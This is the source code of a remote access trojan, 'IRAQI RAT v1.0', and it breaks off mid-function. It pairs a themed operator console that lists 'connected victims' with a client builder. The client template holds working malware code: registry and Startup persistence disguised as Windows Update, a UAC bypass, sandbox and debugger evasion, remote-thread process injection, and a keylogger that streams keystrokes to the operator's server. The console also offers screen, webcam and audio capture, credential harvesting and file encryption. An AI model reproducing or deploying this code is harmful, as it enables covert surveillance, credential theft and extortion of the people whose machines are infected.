import tkinter as tk
from tkinter import ttk, filedialog
from tkinter import simpledialog
from tkinter.messagebox import showwarning, showerror, showinfo
import socket
import threading
import os
from PIL import Image, ImageTk
import cv2
import numpy as np
import struct
import random
import string
import json
import ast
import subprocess
import time
import shutil

# Server Configuration
SERVER_IP = '0.0.0.0'
SERVER_PORT = 4444
SERVER_ADDRESS = (SERVER_IP, SERVER_PORT)
BUFFER_SIZE = 4096
SYSTEM_USER = os.getlogin()
conns = []
clients = []
names = []
keyloggerToggle = False

THEMES = {
    "hacker": {
        "name": "Matrix",
        "colors": {
            "bg_dark": "#000000",
            "bg_medium": "#0C1414",
            "terminal_green": "#00FF41",
            "cyber_blue": "#00FF41",
            "warning": "#FF3800",
            "danger": "#FF0000",
            "success": "#00FF41",
            "text": "#00FF41",
            "text_highlight": "#FFFFFF",
            "border": "#00FF41"
        }
    },

    "ghost_in_shell": {
        "name": "Ghost in Shell",
        "colors": {
            "bg_dark": "#1A1A1A",
            "bg_medium": "#2A2A2A",
            "terminal_green": "#00F6FF",
            "cyber_blue": "#7AA2F7",
            "warning": "#E0AF68",
            "danger": "#F7768E",
            "success": "#9ECE6A",
            "text": "#00F6FF",
            "text_highlight": "#FFFFFF",
            "border": "#7AA2F7"
        }
    },

    "neon_glow": {
        "name": "Neon Glow",
        "colors": {
            "bg_dark": "#1A1A1A",
            "bg_medium": "#2E2E2E",
            "terminal_green": "#00FF00",
            "text": "#FFFFFF",
            "warning": "#FFCC00",
            "danger": "#FF0000",
            "success": "#00CC00",
            "text_highlight": "#FFFFFF",
            "border": "#00FF00"
        }
    },

    "black_ops": {
        "name": "Black Ops",
        "colors": {
            "bg_dark": "#0D0D0D",
            "bg_medium": "#1A1A1A",
            "terminal_green": "#FF6B00",
            "cyber_blue": "#4D4D4D",
            "warning": "#FFD700",
            "danger": "#FF0000",
            "success": "#FF6B00",
            "text": "#FF6B00",
            "text_highlight": "#FFFFFF",
            "border": "#FF6B00"
        }
    },

    "iraqi": {
        "name": "Baghdad Nights",
        "colors": {
            "bg_dark": "#0A0F0D",
            "bg_medium": "#1C2B23",
            "terminal_green": "#FFD700",
            "cyber_blue": "#00A86B",
            "warning": "#CE1126",
            "danger": "#B30000",
            "success": "#14A84B",
            "text": "#E6B800",
            "text_highlight": "#FFFFFF",
            "border": "#907000"
        }
    },

    "nordic_dark": {
        "name": "Nordic Dark",
        "colors": {
            "bg_dark": "#2E3440",
            "bg_medium": "#3B4252",
            "terminal_green": "#A3BE8C",
            "cyber_blue": "#88C0D0",
            "warning": "#EBCB8B",
            "danger": "#BF616A",
            "success": "#A3BE8C",
            "text": "#D8DEE9",
            "text_highlight": "#ECEFF4",
            "border": "#5E81AC"
        }
    },

    "cyberpunk_retro": {
        "name": "Cyberpunk Retro",
        "colors": {
            "bg_dark": "#1B1E2B",
            "bg_medium": "#2A2F3C",
            "terminal_green": "#00FFA6",
            "cyber_blue": "#4BE4E2",
            "warning": "#FFD300",
            "danger": "#FF0266",
            "success": "#6EE7B7",
            "text": "#E5E5E5",
            "text_highlight": "#FFFFFF",
            "border": "#FF0266"
        }
    },

    "sunset_bliss": {
        "name": "Sunset Bliss",
        "colors": {
            "bg_dark": "#2C061F",
            "bg_medium": "#374045",
            "terminal_green": "#FF7F50",
            "cyber_blue": "#FFB347",
            "warning": "#E63946",
            "danger": "#D72638",
            "success": "#6A0572",
            "text": "#F1FAEE",
            "text_highlight": "#FFFFFF",
            "border": "#FFB347"
        }
    },

    "galactic_violet": {
        "name": "Galactic Violet",
        "colors": {
            "bg_dark": "#0D0221",
            "bg_medium": "#251E40",
            "terminal_green": "#A29BFE",
            "cyber_blue": "#81ECEC",
            "warning": "#FF7675",
            "danger": "#D63031",
            "success": "#00CEC9",
            "text": "#FFFFFF",
            "text_highlight": "#FFFFFF",
            "border": "#6C5CE7"
        }
    },

    "oceanic_wave": {
        "name": "Oceanic Wave",
        "colors": {
            "bg_dark": "#1B2B34",
            "bg_medium": "#2C3E50",
            "terminal_green": "#99C794",
            "cyber_blue": "#6699CC",
            "warning": "#F99157",
            "danger": "#EC5F67",
            "success": "#99C794",
            "text": "#C0C5CE",
            "text_highlight": "#FFFFFF",
            "border": "#5FB3B3"
        }
    },

    "zen_blossom": {
        "name": "Zen Blossom",
        "colors": {
            "bg_dark": "#252525",
            "bg_medium": "#343434",
            "terminal_green": "#A3BE8C",
            "cyber_blue": "#8FBCBB",
            "warning": "#D08770",
            "danger": "#BF616A",
            "success": "#A3BE8C",
            "text": "#ECEFF4",
            "text_highlight": "#FFFFFF",
            "border": "#5E81AC"
        }
    },
        "desert_storm": {
        "name": "Desert Storm",
        "colors": {
            "bg_dark": "#2F241D",
            "bg_medium": "#40342B",
            "terminal_green": "#C2B280",
            "cyber_blue": "#6E8894",
            "warning": "#D9A066",
            "danger": "#FF5733",
            "success": "#88C776",
            "text": "#E3DAC9",
            "text_highlight": "#FFFFFF",
            "border": "#C2B280"
        }
    },

    "frostbyte": {
        "name": "Frostbyte",
        "colors": {
            "bg_dark": "#0A1B2A",
            "bg_medium": "#112B44",
            "terminal_green": "#89DCEB",
            "cyber_blue": "#4B89DC",
            "warning": "#FFC857",
            "danger": "#E63946",
            "success": "#42A5F5",
            "text": "#D8DEE9",
            "text_highlight": "#FFFFFF",
            "border": "#3B82F6"
        }
    },

    "red_dragon": {
        "name": "Red Dragon",
        "colors": {
            "bg_dark": "#210002",
            "bg_medium": "#3C090A",
            "terminal_green": "#FF4500",
            "cyber_blue": "#E63946",
            "warning": "#FFC300",
            "danger": "#FF1B00",
            "success": "#A23B72",
            "text": "#FFD7D7",
            "text_highlight": "#FFFFFF",
            "border": "#FF4500"
        }
    },

    "midnight_nebula": {
        "name": "Midnight Nebula",
        "colors": {
            "bg_dark": "#000C18",
            "bg_medium": "#1B263B",
            "terminal_green": "#21C5FF",
            "cyber_blue": "#8A2BE2",
            "warning": "#FF9F1C",
            "danger": "#E63946",
            "success": "#3EC5F1",
            "text": "#E5E5E5",
            "text_highlight": "#FFFFFF",
            "border": "#00A4CC"
        }
    },

    "sunset_sakura": {
        "name": "Sunset Sakura",
        "colors": {
            "bg_dark": "#2D1B1B",
            "bg_medium": "#3E2723",
            "terminal_green": "#FF77A9",
            "cyber_blue": "#FFB6C1",
            "warning": "#F4A261",
            "danger": "#E63946",
            "success": "#FF7F50",
            "text": "#FFE3E3",
            "text_highlight": "#FFFFFF",
            "border": "#F76C6C"
        }
    },

    "metallic_shadow": {
        "name": "Metallic Shadow",
        "colors": {
            "bg_dark": "#1C1C1C",
            "bg_medium": "#2B2B2B",
            "terminal_green": "#F0E130",
            "cyber_blue": "#8B9EA3",
            "warning": "#FFCC00",
            "danger": "#FF4E00",
            "success": "#32CD32",
            "text": "#FFFFFF",
            "text_highlight": "#E5E5E5",
            "border": "#606060"
        }
    },

    "solar_flare": {
        "name": "Solar Flare",
        "colors": {
            "bg_dark": "#3C0910",
            "bg_medium": "#5E1515",
            "terminal_green": "#FFB400",
            "cyber_blue": "#FF5733",
            "warning": "#FFD700",
            "danger": "#FF4500",
            "success": "#FFA500",
            "text": "#FFFFFF",
            "text_highlight": "#FFFAE3",
            "border": "#FFB400"
        }
    },

    "emerald_twilight": {
        "name": "Emerald Twilight",
        "colors": {
            "bg_dark": "#002B36",
            "bg_medium": "#073642",
            "terminal_green": "#2AA198",
            "cyber_blue": "#268BD2",
            "warning": "#B58900",
            "danger": "#DC322F",
            "success": "#859900",
            "text": "#EEE8D5",
            "text_highlight": "#FDF6E3",
            "border": "#839496"
        }
    },

    "retro_vibes": {
        "name": "Retro Vibes",
        "colors": {
            "bg_dark": "#2B0504",
            "bg_medium": "#3E0E02",
            "terminal_green": "#FF7F50",
            "cyber_blue": "#5DADE2",
            "warning": "#F39C12",
            "danger": "#C0392B",
            "success": "#27AE60",
            "text": "#FDFEFE",
            "text_highlight": "#F5B041",
            "border": "#E74C3C"
        }
    },

    "dark_mode_grape": {
        "name": "Dark Mode Grape",
        "colors": {
            "bg_dark": "#2D132C",
            "bg_medium": "#4A1E39",
            "terminal_green": "#9A48D0",
            "cyber_blue": "#7B52AB",
            "warning": "#FF9A8B",
            "danger": "#D72638",
            "success": "#B388EB",
            "text": "#EAD7D7",
            "text_highlight": "#FFFFFF",
            "border": "#9A48D0"
        }
    }
}


def get_theme_style_config(theme_name):
    """Get specific widget style configurations based on theme"""
    base_config = {
        "border_width": 1,
        "relief": "solid",
        "button_padding": (20, 10),
        "entry_padding": 8,
        "layout": {
            "TEntry": [
                ("Entry.field", {"children": [
                    ("Entry.padding", {"children": [
                        ("Entry.textarea", {"sticky": "nswe"})
                    ], "sticky": "nswe"})
                ], "border": "1", "sticky": "nswe"})
            ],
            "TCombobox": [
                ("Combobox.field", {"children": [
                    ("Combobox.padding", {"children": [
                        ("Combobox.textarea", {"sticky": "nswe"})
                    ], "sticky": "nswe"})
                ], "border": "1", "sticky": "nswe"})
            ]
        }
    }

    theme_styles = {
        "hacker": {
            "border_width": 1,
            "relief": "solid",
            "button_padding": (20, 10),
            "layout": base_config["layout"]
        },
        "ghost_in_shell": {
            "border_width": 2,
            "relief": "flat",
            "button_padding": (20, 10),
            "layout": {
                "TEntry": [
                    ("Entry.field", {"children": [
                        ("Entry.padding", {"children": [
                            ("Entry.textarea", {"sticky": "nswe"})
                        ], "sticky": "nswe", "padding": 5})
                    ], "border": "2", "sticky": "nswe"})
                ]
            }
        },
        "neon_glow": {
            "border_width": 2,
            "relief": "flat",
            "button_padding": (20, 10),
            "layout": base_config["layout"]
        },
        "black_ops": {
            "border_width": 2,
            "relief": "flat",
            "button_padding": (20, 10),
            "layout": base_config["layout"]
        },
        
        "iraqi": {
            "border_width": 2,
            "relief": "flat",
            "button_padding": (20, 10),
            "layout": base_config["layout"]
        }
    }

    return theme_styles.get(theme_name, base_config)

def set_theme(theme_name):
    style = ttk.Style()
    style.theme_use("clam")

    colors = THEMES[theme_name]["colors"]
    style_config = get_theme_style_config(theme_name)

    style.configure(".",
        background=colors["bg_dark"],
        foreground=colors["text"],
        font=("JetBrains Mono", 10),
        borderwidth=style_config["border_width"]
    )

    style.configure("Theme.TCombobox",
        background=colors["bg_medium"],
        foreground=colors["text"],
        fieldbackground=colors["bg_medium"],
        selectbackground=colors["terminal_green"],
        selectforeground=colors["bg_dark"],
        arrowcolor=colors["terminal_green"],
        bordercolor=colors["border"],
        lightcolor=colors["border"],
        darkcolor=colors["border"],
        relief=style_config["relief"],
        borderwidth=style_config["border_width"]
    )

    style.configure("Treeview",
        background=colors["bg_medium"],
        foreground=colors["text"],
        fieldbackground=colors["bg_medium"],
        bordercolor=colors["border"],
        lightcolor=colors["border"],
        darkcolor=colors["border"],
        relief=style_config["relief"],
        borderwidth=style_config["border_width"]
    )

    style.configure("Treeview.Heading",
        background=colors["bg_dark"],
        foreground=colors["text"],
        relief=style_config["relief"]
    )

    for button_type in ["Hacker", "Warning", "Danger"]:
        color_key = "terminal_green" if button_type == "Hacker" else button_type.lower()
        style.configure(f"{button_type}.TButton",
            padding=style_config["button_padding"],
            background=colors["bg_dark"],
            foreground=colors[color_key],
            font=("JetBrains Mono", 10, "bold"),
            borderwidth=style_config["border_width"],
            relief=style_config["relief"],
            bordercolor=colors[color_key]
        )

        style.map(f"{button_type}.TButton",
            background=[("active", colors[color_key])],
            foreground=[("active", colors["bg_dark"])]
        )

    style.configure("TEntry",
        fieldbackground=colors["bg_medium"],
        foreground=colors["text"],
        insertcolor=colors["text"],
        borderwidth=style_config["border_width"],
        relief=style_config["relief"]
    )

    style.configure("TNotebook",
        background=colors["bg_dark"],
        bordercolor=colors["border"],
        relief=style_config["relief"]
    )

    style.configure("TNotebook.Tab",
        padding=(10, 4),
        background=colors["bg_medium"],
        foreground=colors["text"],
        borderwidth=style_config["border_width"],
        relief=style_config["relief"]
    )

    if "layout" in style_config:
        for widget, layout in style_config["layout"].items():
            try:
                style.layout(widget, layout)
            except tk.TclError:
                pass

    return colors


class Rat:
    def __init__(self, root):
        self.root = root
        self.root.title("[IRAQI-RAT v1.0]")
        self.root.geometry("1300x800")
        self.current_theme = "hacker"
        self.colors = set_theme(self.current_theme)
        self.root.configure(bg=self.colors["bg_dark"])
        self.screen_viewer = None
        self.screen_viewer_active = False
        self.running_threads = {}
        self.create_widgets()

    def create_widgets(self):
        theme_frame = tk.Frame(
            self.root,
            bg=self.colors["bg_dark"],
            highlightbackground=self.colors["border"],
            highlightthickness=1,
            padx=10,
            pady=5
        )
        theme_frame.pack(fill="x", padx=20, pady=(20, 0))
        
        theme_icon = "🎨"
        tk.Label(
            theme_frame,
            text=theme_icon,
            font=("Segoe UI Emoji", 14),
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"],
        ).pack(side="left", padx=(5, 10))
        
        tk.Label(
            theme_frame,
            text="Interface Theme",
            font=("JetBrains Mono", 10, "bold"),
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack(side="left", padx=(0, 10))
        
        self.theme_var = tk.StringVar(value=THEMES[self.current_theme]["name"])
        theme_menu = ttk.Combobox(
            theme_frame,
            textvariable=self.theme_var,
            values=[theme["name"] for theme in THEMES.values()],
            state="readonly",
            style="Theme.TCombobox",
            width=15
        )
        theme_menu.pack(side="left", padx=5)
        
        def on_theme_change(event):
            selected_name = self.theme_var.get()
            for key, theme in THEMES.items():
                if theme["name"] == selected_name:
                    self.change_theme(key)
                    break
                    
        theme_menu.bind('<<ComboboxSelected>>', on_theme_change)
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)
        title_text = """
╔══════════════════════════════════════════════════╗
║     ██▓▒­░⡷⢾ IRAQI RAT v1.0 By Apkaless ⡷⢾░▒▓██     ║
╚══════════════════════════════════════════════════╝
        """
        title = tk.Label(
            main_frame,
            text=title_text,
            font=("Courier", 14, "bold"),
            fg=self.colors['terminal_green'],
            bg=self.colors["bg_dark"],
            justify="center"
        )
        title.pack(pady=(0, 20))

        content = tk.Frame(
            main_frame,
            bg=self.colors["bg_dark"],
            highlightbackground=self.colors["terminal_green"],
            highlightthickness=1
        )
        content.pack(fill="both", expand=True, pady=(0, 20))
        content.grid_columnconfigure(1, weight=1)

        # Victims list section
        client_frame = tk.Frame(
            content,
            bg=self.colors["bg_dark"],
            highlightbackground=self.colors["terminal_green"],
            highlightthickness=1
        )
        client_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)

        tk.Label(
            client_frame,
            text="[CONNECTED VICTIMS]",
            font=("Courier", 12, "bold"),
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack(pady=(5, 10))

        self.client_list = tk.Listbox(
            client_frame,
            height=20,
            width=40,
            bg=self.colors["bg_medium"],
            fg=self.colors["terminal_green"],
            selectbackground=self.colors["terminal_green"],
            selectforeground=self.colors["bg_dark"],
            font=("Courier", 10),
            relief="solid",
            borderwidth=1,
            highlightthickness=1,
            highlightbackground=self.colors["terminal_green"]
        )
        self.client_list.pack(fill="both", expand=True, padx=5, pady=5)
        self.client_list.bind("<<ListboxSelect>>", self.display_client_actions)

        # Actions section
        actions_frame = tk.Frame(content, bg=self.colors["bg_dark"])
        actions_frame.grid(row=0, column=1, sticky="nsew", padx=10, pady=10)

        actions = [
        ("[ START KEYLOGGER ]", self.start_keylogger, "Hacker.TButton"),
        ("[ TERMINATE KEYLOGGER ]", self.stop_keylogger, "Warning.TButton"),
        ("[ START SCREEN CAPTURE ]", self.start_screen_share, "Hacker.TButton"),
        ("[ TERMINATE SCREEN CAPTURE ]", self.stop_screen_share, "Warning.TButton"),
        ("[ DOWNLOAD FILE ]", self.open_download_window, "Hacker.TButton"),
        ("[ UPLOAD PAYLOAD ]", self.upload_file, "Hacker.TButton"),
        ("[ CAPTURE SCREENSHOT ]", self.take_screenshot, "Hacker.TButton"),
        ("[ SEND CUSTOM COMMAND ]", self.send_custom_command, "Hacker.TButton"),
        ("[ TERMINATE CONNECTION ]", self.disconnect_client, "Danger.TButton"),
        ("[ WEBCAM CAPTURE ]", self.capture_webcam, "Hacker.TButton"),
        ("[ PROCESS MANAGER ]", self.show_processes, "Hacker.TButton"),
        ("[ CREDENTIALS HARVESTER ]", self.harvest_credentials, "Hacker.TButton"),
        ("[ AUDIO RECORDER ]", self.record_audio, "Hacker.TButton"),
        ("[ ENCRYPT FILES ]", self.encrypt_files, "Warning.TButton"),
        ("[ DECRYPT FILES ]", self.decrypt_files, "Warning.TButton"),
        ("[ BUILD EXE ]", self.builder, "Hacker.TButton")
    ]

        for text, command, style in actions:
            btn = ttk.Button(
                actions_frame,
                text=text,
                command=command,
                style=style
            )
            btn.pack(fill="x", pady=5)

        # Log section
        log_frame = tk.Frame(
            main_frame,
            bg=self.colors["bg_dark"],
            highlightbackground=self.colors["terminal_green"],
            highlightthickness=1
        )
        log_frame.pack(fill="both", expand=True)

        tk.Label(
            log_frame,
            text="[SYSTEM LOG]",
            font=("Courier", 12, "bold"),
            fg=self.colors["terminal_green"],
            bg=self.colors["bg_dark"]
        ).pack(pady=(5, 10))

        self.log_area = tk.Text(
            log_frame,
            height=8,
            bg=self.colors["bg_medium"],
            fg=self.colors["terminal_green"],
            font=("Courier", 10),
            wrap="word",
            relief="solid",
            borderwidth=1,
            padx=10,
            pady=10,
            insertbackground=self.colors["terminal_green"]
        )
        self.log_area.pack(fill="both", expand=True, padx=5, pady=5)
        self.log_area.config(state=tk.DISABLED)
        
    def change_theme(self, theme_name):
            self.current_theme = theme_name
            self.colors = set_theme(theme_name)
            self.root.configure(bg=self.colors["bg_dark"])

            def update_widget_colors(widget):
                common_config = {
                    "bg": self.colors["bg_dark"],
                    "fg": self.colors["terminal_green"],
                    "highlightbackground": self.colors["border"]
                }

                for attr, value in common_config.items():
                    try:
                        widget.configure({attr: value})
                    except tk.TclError:
                        pass

                if isinstance(widget, tk.Text):
                    widget.configure(
                        bg=self.colors["bg_medium"],
                        fg=self.colors["terminal_green"],
                        insertbackground=self.colors["terminal_green"]
                    )
                elif isinstance(widget, tk.Listbox):
                    widget.configure(
                        bg=self.colors["bg_medium"],
                        fg=self.colors["terminal_green"],
                        selectbackground=self.colors["terminal_green"],
                        selectforeground=self.colors["bg_dark"]
                    )
                elif isinstance(widget, tk.Canvas):
                    widget.configure(
                        bg=self.colors["bg_dark"],
                        highlightbackground=self.colors["terminal_green"]
                    )

                for child in widget.winfo_children():
                    update_widget_colors(child)

            update_widget_colors(self.root)

            self.log_area.configure(
                bg=self.colors["bg_medium"],
                fg=self.colors["terminal_green"],
                insertbackground=self.colors["terminal_green"]
            )

            for widget in self.root.winfo_children():
                if isinstance(widget, ttk.Frame):
                    for child in widget.winfo_children():
                        if isinstance(child, tk.Label) and "IRAQI RAT" in str(child.cget("text")):
                            child.configure(
                                fg=self.colors["terminal_green"],
                                bg=self.colors["bg_dark"]
                            )

            if hasattr(self, 'keylog_window') and self.keylog_window:
                self.keylog_window.configure(bg=self.colors["bg_dark"])
                if hasattr(self, 'keylog_text'):
                    self.keylog_text.configure(
                        bg=self.colors["bg_medium"],
                        fg=self.colors["terminal_green"],
                        insertbackground=self.colors["terminal_green"]
                    )

            if hasattr(self, 'process_window') and self.process_window:
                self.process_window.configure(bg=self.colors["bg_dark"])
                if hasattr(self, 'process_tree'):
                    style = ttk.Style()
                    style.configure("Treeview",
                        background=self.colors["bg_medium"],
                        foreground=self.colors["terminal_green"],
                        fieldbackground=self.colors["bg_medium"]
                    )
                    style.configure("Treeview.Heading",
                        background=self.colors["bg_dark"],
                        foreground=self.colors["terminal_green"]
                    )

            if hasattr(self, 'screen_viewer') and self.screen_viewer:
                self.screen_viewer.configure(bg=self.colors["bg_dark"])
                if hasattr(self, 'screen_canvas'):
                    self.screen_canvas.configure(
                        bg=self.colors["bg_dark"],
                        highlightbackground=self.colors["terminal_green"]
                    )

            if hasattr(self, 'webcam_viewer') and self.webcam_viewer:
                self.webcam_viewer.configure(bg=self.colors["bg_dark"])
                if hasattr(self, 'webcam_canvas'):
                    self.webcam_canvas.configure(
                        bg=self.colors["bg_dark"],
                        highlightbackground=self.colors["terminal_green"]
                    )


    def create_and_start_thread(self, target, name, args=()):
        """Helper method to create and start threads safely"""
        if name in self.running_threads and self.running_threads[name].is_alive():
            self.log(f"Thread {name} is already running")
            return None
            
        thread = threading.Thread(target=target, args=args, name=name, daemon=True)
        self.running_threads[name] = thread
        thread.start()
        return thread

    def log(self, message):
        self.log_area.config(state=tk.NORMAL)
        timestamp = threading.current_thread().name
        self.log_area.insert(tk.END, f"[{timestamp}] > {message}\n")
        self.log_area.config(state=tk.DISABLED)
        self.log_area.see(tk.END)
    
    def generate_client(self, config):
        import shutil
        import tempfile
        server_ip = config['SERVER_IP']
        server_port = config['SERVER_PORT']
        persistence = config['PERSISTENCE']
        uac_bypass = config['UAC_BYPASS']
        anivirue = config['ANTIVIRUS_EVASION']
        stealth = config['STEALTH']
        process_injection = config['PROCESS_INJECTION']
        process_name = config['PROCESS_NAME'] if process_injection else 'iraqisgreat'
        outputname = config['OUTPUT_NAME']
        iconpath = config['ICON_PATH']
        client_code = r'''
import socket
import os
import subprocess
import sys
from pynput.keyboard import Listener
from threading import Thread
from time import sleep
from PIL import ImageGrab, Image
import cv2
import numpy as np
from tkinter.messagebox import showwarning
import pyautogui
import struct
import threading
import io
import sounddevice as sd
import wave
import cryptography
from cryptography.fernet import Fernet
import psutil
import shutil
import json
import time
import winreg
import ctypes
import win32com
import win32com.client
import win32api
import win32process
import win32con
import win32clipboard
import win32gui

# import browser_cookie3

# Configuration
SERVER_IP = '%s'
SERVER_PORT = %s
SERVER_ADDRESS = (SERVER_IP, SERVER_PORT)
BUFFER_SIZE = 4096




def add_persistence():
    if %s:
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as registry_key:
                winreg.SetValueEx(registry_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)

            startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            if not os.path.exists(startup_folder):
                os.makedirs(startup_folder)

            target_path = os.path.join(startup_folder, "WindowsUpdate.exe")

            if not os.path.exists(target_path):
                shutil.copy2(exe_path, target_path)

        except Exception as e:
            # print(f"Persistence Error: {e}")
            pass

        

def bypass_uac():
    if %s:
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return

            current_exe = sys.executable
            if not current_exe.endswith('.exe'):
                return

            startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            if not os.path.exists(startup_folder):
                os.makedirs(startup_folder)

            shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")

            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.TargetPath = current_exe
            shortcut.WorkingDirectory = os.path.dirname(current_exe)
            shortcut.WindowStyle = 7
            shortcut.IconLocation = "shell32.dll,0"
            shortcut.Description = "Windows Update"
            shortcut.Save()

            with open(shortcut_path, 'rb') as f:
                data = bytearray(f.read())
            data[0x15] = data[0x15] | 0x20
            with open(shortcut_path, 'wb') as f:
                f.write(data)

        except Exception as e:
            print(f"Bypass UAC Error: {e}")
            pass

def evade_antivirus():
    if %s:
        try:
            username = os.getenv("USERNAME", "").lower()
            computername = os.getenv("COMPUTERNAME", "").lower()
            
            suspicious_users = ["wdagutilityaccount", "sandbox", "virus", "malware"]
            suspicious_computers = ["sandbox", "virus-pc", "malware-pc"]

            if username in suspicious_users or computername in suspicious_computers:
                sys.exit()
            
            processes = [proc.name().lower() for proc in psutil.process_iter(['name'])]
            process_blacklist = [
                "processhacker.exe", "wireshark.exe", "fiddler.exe",
                "debugger.exe", "analyzer.exe", "ida64.exe", "ollydbg.exe",
                "x64dbg.exe", "immunitydebugger.exe", "procexp.exe"
            ]

            if any(proc in processes for proc in process_blacklist):
                sys.exit()  
            
            vm_processes = [
                "vmsrvc.exe", "vmusrvc.exe", "vmtoolsd.exe",
                "vmwaretray.exe", "vmwareuser.exe", "vgauthservice.exe",
                "virtualbox.exe", "vboxservice.exe", "vboxtray.exe"
            ]

            if any(proc in processes for proc in vm_processes):
                sys.exit()

            time.sleep(10)

        except Exception as e:
            print(f"Evade Antivirus Error: {e}")
            pass

def hide_process():
    if %s:
        try:
            pid = os.getpid()
            hProcess = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)  # PROCESS_ALL_ACCESS
            
            ctypes.windll.kernel32.SetPriorityClass(hProcess, 0x00000040)  # Below Normal Priority
            ctypes.windll.kernel32.CloseHandle(hProcess)

            # print("Process hidden from Task Manager.")
        
        except Exception as e:
            # print(f"Error hiding process: {str(e)}")
            pass

def inject_into_process(target_process_name=None):
    if %s:
        try:
            target_process = None

            for proc in psutil.process_iter(['name', 'pid']):
                if proc.info['name'] and proc.info['name'].lower() == target_process_name.lower():
                    target_process = proc
                    break
            
            if target_process is None:
                print(f"Target process {target_process_name} not found.")
                return

            pid = target_process.info['pid']
            
            PROCESS_ALL_ACCESS = 0x1F0FFF
            process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

            if not process_handle:
                print(f"Failed to open process {target_process_name}.")
                return

            payload_path = os.path.abspath(__file__)
            payload_path_bytes = payload_path.encode('utf-8')
            payload_size = len(payload_path_bytes)

            allocated_memory = ctypes.windll.kernel32.VirtualAllocEx(
                process_handle, 
                0, 
                payload_size, 
                0x3000,
                0x40
            )

            if not allocated_memory:
                print("Memory allocation failed.")
                return

            written = ctypes.c_size_t(0)
            ctypes.windll.kernel32.WriteProcessMemory(
                process_handle, 
                allocated_memory, 
                payload_path_bytes, 
                payload_size, 
                ctypes.byref(written)
            )

            thread_handle = ctypes.windll.kernel32.CreateRemoteThread(
                process_handle, 
                None, 
                0, 
                allocated_memory, 
                0, 
                0, 
                None
            )

            if not thread_handle:
                print("Failed to create remote thread.")
            else:
                print(f"Injected payload into {target_process_name}.")

        except Exception as e:
            pass

class ClientAPP:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.keylogger_toggle = False
        self.screen_share_toggle = False
        self.keylogger_thread = None
        self.screen_share_thread = None
        self.keylogger_active = None
        self.key_buffer = []
        self.last_send = time.time()
        
    def connect(self):
        try:
            self.socket.connect(SERVER_ADDRESS)
            self.socket.send(str(os.getlogin()).encode())
            return True
        except Exception as e:
            print(f"Connection error: {e}")
            return False

    def start_keylogger(self):
            try:
                self.keylogger_active = True
                self.key_buffer = []
                self.last_send = time.time()
                self.create_keylogger_thread()
                return True
            except Exception as e:
                print(f"Keylogger start error: {e}")
                return False

    def stop_keylogger(self):
        try:
            self.keylogger_active = False
            self.flush_key_buffer()
            return True
        except Exception as e:
            print(f"Keylogger stop error: {e}")
            return False

    def create_keylogger_thread(self):
        if hasattr(self, 'listener') and self.listener.running:
            print("Keylogger already running.")
            return

        def on_press(key):
            if not self.keylogger_active:            
                print('letter')
                return False
            print('KeyLog letter')

            try:
                if hasattr(key, 'char') and key.char is not None:
                    key_str = key.char
                else:
                    key_str = f"[{key.name.upper()}]"

                self.socket.send(f"KEYLOG:{key_str}".encode())
                print('KeyLog Sent letter')
            except Exception as e:
                print(f"Send error: {e}")

        def on_release(key):
            return self.keylogger_active

        self.listener = Listener(on_press=on_press, on_release=on_release)
        self.listener.start()

    def flush_key_buffer(self):
        try:
            if self.key_buffer:
                data = ''.join(self.key_buffer)
                self.socket.send(f"KEYLOG:{data}".encode())
                self.key_buffer.clear()
        except Exception as e:
            print(f"Buffer flush error: {e}")



    def screen_share(self):
        try:
            while self.screen_share_toggle:
                # Capture screen
                screenshot = pyautogui.screenshot()
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

                # Compress frame
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
                buffer_size = len(buffer)

                # Send frame size then data
                self.socket.send(struct.pack('L', buffer_size))
                self.socket.send(buffer)

                # Control frame rate
                time.sleep(0.033)

            self.socket.send(b"ACK_STOP_SCREEN_SHARE")
        except Exception as e:
            print(f"Screen sharing error: {e}")
        finally:
            self.screen_share_toggle = False


    def take_screenshot(self, picname):
        try:
            screenshot = pyautogui.screenshot()
            # img_byte_arr = io.BytesIO()
            screenshot.save(picname, format='PNG')
            with open(picname, 'rb') as pic:
                while True:
                    data = pic.read(BUFFER_SIZE)
                    if not data:
                        pic.close()
                        os.remove(picname)
                        self.socket.send('SUCCESS'.encode())
                        break
                    self.socket.send(data)
        except Exception as e:
            self.socket.send('SUCCESS'.encode())

    def download_file(self, filepath):
        try:
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    while True:
                        data = f.read(BUFFER_SIZE)
                        if not data:
                            self.socket.send('SUCCESS'.encode())
                            f.close()
                            break
                        self.socket.send(data)
            else:
                self.socket.send('NOT_FOUND'.encode())
        except Exception as e:
            print(f"Download error: {e}")
            self.socket.send('ERROR'.encode())

    def upload_file(self, filepath):
        try:
            with open(filepath, 'wb') as f:
                while True:
                    data = self.socket.recv(BUFFER_SIZE)
                    if 'SUCCESS'.encode() in data:
                        f.close()
                        break
                    f.write(data)
        except Exception as e:
            print(f"Upload error: {e}")

    def capture_webcam(self):
        try:
            self.webcam = cv2.VideoCapture(0)
            if not self.webcam.isOpened():
                raise Exception("Could not open webcam")
                
            self.webcam_active = True
            
            while self.webcam_active:
                ret, frame = self.webcam.read()
                if ret:
                    # Compress frame
